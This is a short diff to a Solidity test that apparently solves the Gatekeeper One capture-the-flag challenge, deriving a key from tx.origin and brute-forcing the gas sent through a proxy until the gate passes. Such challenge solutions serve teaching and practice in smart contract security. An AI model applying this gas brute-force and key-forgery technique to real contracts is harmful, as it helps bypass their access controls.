@@ -60,8 +60,8 @@ contract GatekeeperOneTest is Test {
     Proxy proxy = new Proxy(challengeAddress);
     bytes8 key = bytes8(uint16(uint160(tx.origin)) + 0x1000000000000000);
 
-    for (uint i = 0; i < 8191; i++) {
-      if (proxy.enter{gas: (8191 * 3) + i}(key)) {
+    for (uint i = 27000; i > 0; i--) {
+      if (proxy.enter{gas: i}(key)) {
         require(challengeFactory.validateInstance(payable(challengeAddress), tx.origin));
         break;
       }
